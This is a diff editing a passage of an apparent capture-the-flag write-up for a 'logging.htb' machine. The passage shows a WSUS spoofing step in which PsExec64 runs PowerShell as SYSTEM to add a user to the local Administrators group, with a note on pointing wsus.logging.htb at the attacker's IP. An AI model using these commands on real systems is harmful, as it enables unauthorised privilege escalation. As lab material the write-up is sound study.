@@ -874,7 +874,9 @@ PsExec64.exe /accepteula /s powershell.exe "net localgroup Administrators wallac
 [+] GET request for exe: /2cead5a0-cde3-4389-9e62-2903f783d585/PsExec64.exe
 ```
 
-Ill run the command, then the service will run and make a connection back, its important to make sure you have your own IP in your `/etc/hosts` in the format 
+Ill run the command, then the service will run and make a connection back, its important to make sure you have your own IP in your `/etc/hosts` in the format `<your IP> wsus.logging.htb`
+
+After getting the connection it will have ran the command as SYSTEM
 
 # Domain Admin
 
